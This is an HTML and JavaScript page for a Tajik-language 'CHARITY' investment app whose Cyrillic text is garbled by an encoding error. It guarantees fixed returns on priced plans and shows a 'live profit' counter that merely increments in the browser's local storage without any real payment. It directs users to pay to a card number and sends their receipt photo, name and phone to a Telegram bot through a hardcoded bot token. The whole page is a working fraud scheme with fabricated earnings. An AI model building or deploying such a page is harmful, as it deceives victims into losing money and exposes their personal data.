<!DOCTYPE html>
<html lang="tg">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CHARITY | –ë–æ–≤–∞—Ä–∏–∏ –®—É–º–æ</title>
    <style>
        :root { --gold: #ffcc00; --dark: #070b14; --card: #151c2c; --green: #00ff88; --text-gray: #94a3b8; }
        body { margin: 0; padding: 0; font-family: 'Segoe UI', sans-serif; background: var(--dark); color: white; }
        .page { display: none; padding: 20px; padding-bottom: 100px; animation: fadeIn 0.3s; }
        .active-page { display: block; }
        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
        .glass-card { background: var(--card); border-radius: 20px; padding: 20px; border: 1px solid #2d3748; margin-bottom: 20px; }
        .btn-main { background: linear-gradient(45deg, var(--gold), #ffaa00); color: black; padding: 15px; border: none; border-radius: 12px; font-weight: bold; width: 100%; cursor: pointer; }
        .vip-item { display: flex; justify-content: space-between; align-items: center; background: #1e293b; padding: 18px; border-radius: 15px; margin-bottom: 12px; border-left: 4px solid var(--gold); }
        .nav { position: fixed; bottom: 0; width: 100%; background: #0f172a; display: flex; justify-content: space-around; padding: 12px 0; border-top: 1px solid #1e293b; }
        .nav-item { color: var(--text-gray); text-align: center; font-size: 11px; flex: 1; }
        .active-nav { color: var(--gold); }
        input { width: 100%; padding: 14px; margin: 10px 0; border-radius: 10px; border: 1px solid #2d3748; background: #0f172a; color: white; box-sizing: border-box; }
    </style>
</head>
<body>

<div id="page-reg" class="page">
    <div style="text-align: center; margin-top: 50px;">
        <h1 style="color: var(--gold);">CHARITY</h1>
        <p>–ë–∞—Ä–æ–∏ –æ“ì–æ–∑ –≤–æ—Ä–∏–¥ —à–∞–≤–µ–¥</p>
        <div class="glass-card">
            <input type="text" id="reg-name" placeholder="–ù–æ–º–∏ —à—É–º–æ">
            <input type="tel" id="reg-phone" placeholder="–¢–µ–ª–µ—Ñ–æ–Ω">
            <button class="btn-main" onclick="register()">–í–û–†–ò–î –®–£–î–ê–ù</button>
        </div>
    </div>
</div>

<div id="page-home" class="page">
    <div class="glass-card" style="border: 1px solid var(--gold);">
        <h2 style="margin-top:0">–ö–∞—Ñ–æ–ª–∞—Ç–∏ 100% üõ°Ô∏è</h2>
        <p style="font-size: 14px; color: #cbd5e1;">–ú–æ –∫–∞—Ñ–æ–ª–∞—Ç –º–µ–¥–∏“≥–µ–º, –∫–∏ —Å–∏—Å—Ç–µ–º–∞–∏ CHARITY —Ç–æ —è–∫ —Å–æ–ª–∏ –æ—è–Ω–¥–∞ –±–µ—Ç–∞–Ω–∞—Ñ—Ñ—É—Å –∫–æ—Ä –º–µ–∫—É–Ω–∞–¥. –ú–∞–±–ª–∞“ì“≥–æ–∏ —à—É–º–æ –¥–∞—Ä –∞–º–æ–Ω “≥–∞—Å—Ç–∞–Ω–¥ –≤–∞ —Ñ–æ–∏–¥–∞–∏ —à—É–º–æ “≥–∞—Ä —Å–æ–Ω–∏—è –∏–ª–æ–≤–∞ –º–µ—à–∞–≤–∞–¥. –ú–æ –±–∞—Ä–æ–∏ —ç—ä—Ç–∏–º–æ–¥–∏ —à—É–º–æ “∑–∞–≤–æ–±–≥”Ø “≥–∞—Å—Ç–µ–º!</p>
    </div>

    <div class="glass-card" style="text-align: center;">
        <span style="color: var(--text-gray);">–§–æ–∏–¥–∞–∏ LIVE:</span>
        <h1 id="live-profit" style="font-size: 40px; color: var(--green); margin: 10px 0;">0.0000</h1>
        <div id="active-status" style="color: var(--gold); font-weight: bold;">–ù–∞“õ—à–∞ —Ñ–∞—ä–æ–ª –Ω–µ—Å—Ç</div>
    </div>

    <div class="glass-card">
        <h3>–ü—É—Ä –∫–∞—Ä–¥–∞–Ω–∏ –ë–∞–ª–∞–Ω—Å</h3>
        <p style="font-size: 12px; color: var(--text-gray);">–ö–æ—Ä—Ç–∏ –ú–∏–ª–ª”£ –±–∞—Ä–æ–∏ –≥—É–∑–∞—Ä–æ–Ω–∏–¥–∞–Ω:</p>
        <div style="background: #000; padding: 12px; border-radius: 10px; text-align: center; font-weight: bold;">4444 5555 6666 7777</div>
        <input type="file" id="check-file" accept="image/*" style="margin-top:15px;">
        <button id="send-btn" class="btn-main" onclick="sendToTelegram()">–§–ò–†–ò–°–¢–û–î–ê–ù–ò –ß–ï–ö</button>
    </div>
</div>

<div id="page-products" class="page">
    <h2 style="color: var(--gold);">–¢—É–≥–º–∞“≥–æ–∏ –î–∞—Ä–æ–º–∞–¥</h2>
    <div id="vip-list"></div>
</div>

<div id="page-details" class="page">
    <button onclick="showPage('products')" style="background:none; border:none; color:var(--gold); margin-bottom:15px;">‚Üê –ë–æ–∑–≥–∞—à—Ç</button>
    <div id="details-content"></div>
</div>

<div id="page-profile" class="page">
    <div class="glass-card" style="text-align: center;">
        <div style="width:70px; height:70px; background:var(--gold); border-radius:50%; margin:0 auto 10px; display:flex; align-items:center; justify-content:center; color:black; font-size:24px; font-weight:bold;" id="u-icon">U</div>
        <h2 id="p-name">–ö–æ—Ä–±–∞—Ä</h2>
        <p id="p-phone" style="color:var(--text-gray)"></p>
        <button class="btn-main" onclick="window.open('https://t.me/charity_tj', '_blank')" style="background:#24292f; color:white;">üí¨ –ì–£–†”Æ“≤–ò –¢–ï–õ–ï–ì–†–ê–ú</button>
        <br><br>
        <button onclick="logout()" style="color:#ef4444; background:none; border:none;">–•—É—Ä—É“∑</button>
    </div>
</div>

<nav id="nav-bar" class="nav" style="display:none;">
    <div class="nav-item active-nav" onclick="tab(this, 'home')">üè†<br>–ê—Å–æ—Å”£</div>
    <div class="nav-item" onclick="tab(this, 'products')">üîò<br>–¢—É–≥–º–∞“≥–æ</div>
    <div class="nav-item" onclick="tab(this, 'profile')">üë§<br>–ü—Ä–æ—Ñ–∏–ª</div>
</nav>

<script>
    const BOT_TOKEN = "8693263483:AAH1pHi68Akw2rnGMvEvc4_sMlW070PJc1Q";
    const CHAT_ID = "6365005853";

    const vips = [
        { id:1, name:'–¢—É–≥–º–∞–∏ 1', price:120, day:3, desc:'–û“ì–æ–∑–∏ –æ—Å–æ–Ω –±–∞—Ä–æ–∏ “≥–∞–º–∞. –§–æ–∏–¥–∞–∏ —É—Å—Ç—É–≤–æ—Ä.' },
        { id:2, name:'–¢—É–≥–º–∞–∏ 2', price:260, day:6, desc:'–ù–∞“õ—à–∞–∏ –º–∏—ë–Ω–∞ –±–∞—Ä–æ–∏ –¥–∞—Ä–æ–º–∞–¥–∏ –±–µ—à—Ç–∞—Ä.' },
        { id:3, name:'–¢—É–≥–º–∞–∏ 3', price:470, day:15, desc:'–ù–∞“õ—à–∞–∏ VIP –±–æ —Å—É—Ä—ä–∞—Ç–∏ –±–∞–ª–∞–Ω–¥–∏ –¥–∞—Ä–æ–º–∞–¥.' }
    ];

    let user = JSON.parse(localStorage.getItem('charity_u'));
    let activePlan = JSON.parse(localStorage.getItem('charity_p'));
    let balance = parseFloat(localStorage.getItem('charity_b')) || 0;

    window.onload = () => {
        if(user) startApp(); else showPage('reg');
    };

    function register() {
        const name = document.getElementById('reg-name').value;
        const phone = document.getElementById('reg-phone').value;
        if(name && phone) {
            user = { name, phone };
            localStorage.setItem('charity_u', JSON.stringify(user));
            startApp();
        }
    }

    function startApp() {
        document.getElementById('page-reg').style.display='none';
        document.getElementById('nav-bar').style.display='flex';
        document.getElementById('p-name').innerText = user.name;
        document.getElementById('p-phone').innerText = user.phone;
        document.getElementById('u-icon').innerText = user.name[0].toUpperCase();
        showPage('home');
        renderVIPs();
        if(activePlan) document.getElementById('active-status').innerText = "–§–∞—ä–æ–ª: " + activePlan.name;
        
        setInterval(() => {
            if(activePlan) {
                balance += (activePlan.day / 86400);
                document.getElementById('live-profit').innerText = balance.toFixed(4);
                localStorage.setItem('charity_b', balance);
            }
        }, 1000);
    }

    function renderVIPs() {
        const list = document.getElementById('vip-list');
        list.innerHTML = '';
        vips.forEach(v => {
            list.innerHTML += `<div class="vip-item" onclick="showDetails(${v.id})">
                <div><b>${v.name}</b><br><small>${v.price} TJS</small></div>
                <button style="background:var(--gold); border:none; border-radius:5px; padding:5px 10px;">–î–ò–î–ê–ù</button>
            </div>`;
        });
    }

    function showDetails(id) {
        const v = vips.find(x => x.id === id);
        document.getElementById('details-content').innerHTML = `
            <div class="glass-card">
                <h2 style="color:var(--gold)">${v.name}</h2>
                <p>${v.desc}</p>
                <div style="display:grid; grid-template-columns:1fr 1fr; gap:10px; margin:15px 0;">
                    <div class="glass-card" style="padding:10px; margin:0">10 —Ä”Ø–∑:<br><b style="color:var(--green)">${v.day*10} TJS</b></div>
                    <div class="glass-card" style="padding:10px; margin:0">1 –º–æ“≥:<br><b style="color:var(--green)">${v.day*30} TJS</b></div>
                </div>
                <button class="btn-main" onclick="activate(${v.id})">–ò–ù–¢–ò–•–û–ë –ö–ê–†–î–ê–ù</button>
            </div>`;
        showPage('details');
    }

    function activate(id) {
        const v = vips.find(x => x.id === id);
        activePlan = v;
        localStorage.setItem('charity_p', JSON.stringify(v));
        document.getElementById('active-status').innerText = "–§–∞—ä–æ–ª: " + v.name;
        showPage('home');
        alert("–ù–∞“õ—à–∞ –∏–Ω—Ç–∏—Ö–æ–± —à—É–¥! –ê–∫–Ω—É–Ω —á–µ–∫—Ä–æ —Ñ–∏—Ä–∏—Å—Ç–µ–¥.");
    }

    async function sendToTelegram() {
        const file = document.getElementById('check-file').files[0];
        if(!file) return alert("–ê–≤–≤–∞–ª —Å—É—Ä–∞—Ç—Ä–æ –∏–Ω—Ç–∏—Ö–æ–± –∫—É–Ω–µ–¥!");
        
        const btn = document.getElementById('send-btn');
        btn.innerText = "–§–ò–†–ò–°–¢–û–î–ê –ò–°–¢–û–î–ê–ê–°–¢...";
        btn.disabled = true;

        const formData = new FormData();
        formData.append("chat_id", CHAT_ID);
        formData.append("photo", file);
        formData.append("caption", `üí∞ –ß–ï–ö–ò –ù–ê–í\nüë§ –ù–æ–º: ${user.name}\nüìû –¢–µ–ª: ${user.phone}\nüìä –ù–∞“õ—à–∞: ${activePlan ? activePlan.name : '–ò–Ω—Ç–∏—Ö–æ–± –Ω–∞—à—É–¥–∞'}`);

        try {
            const r = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: "POST", body: formData });
            if(r.ok) {
                alert("‚úÖ –ß–µ–∫ –±–æ –º—É–≤–∞—Ñ—Ñ–∞“õ–∏—è—Ç –±–∞ –∞–¥–º–∏–Ω —Ñ–∏—Ä–∏—Å—Ç–æ–¥–∞ —à—É–¥!");
                btn.innerText = "–§–ò–†–ò–°–¢–û–î–ê –®–£–î";
            } else {
                alert("‚ùå –•–∞—Ç–æ–≥”£ –¥–∞—Ä –±–æ—Ç. –ë–æ—Ç—Ä–æ –¥–∞—Ä –¢–µ–ª–µ–≥—Ä–∞–º —è–∫ –±–æ—Ä –°–¢–ê–†–¢ –∫—É–Ω–µ–¥: @charity_admin_boy_bot");
                btn.disabled = false;
                btn.innerText = "–§–ò–†–ò–°–¢–û–î–ê–ù –ë–ê –ê–î–ú–ò–ù";
            }
        } catch(e) {
            alert("üåê –•–∞—Ç–æ–≥–∏–∏ –∏–Ω—Ç–µ—Ä–Ω–µ—Ç!");
            btn.disabled = false;
        }
    }

    function showPage(p) {
        document.querySelectorAll('.page').forEach(x => x.classList.remove('active-page'));
        document.getElementById('page-'+p).classList.add('active-page');
    }

    function tab(el, p) {
        document.querySelectorAll('.nav-item').forEach(x => x.classList.remove('active-nav'));
        el.classList.add('active-nav');
        showPage(p);
    }

    function logout() { localStorage.clear(); location.reload(); }
</script>
</body>
</html>
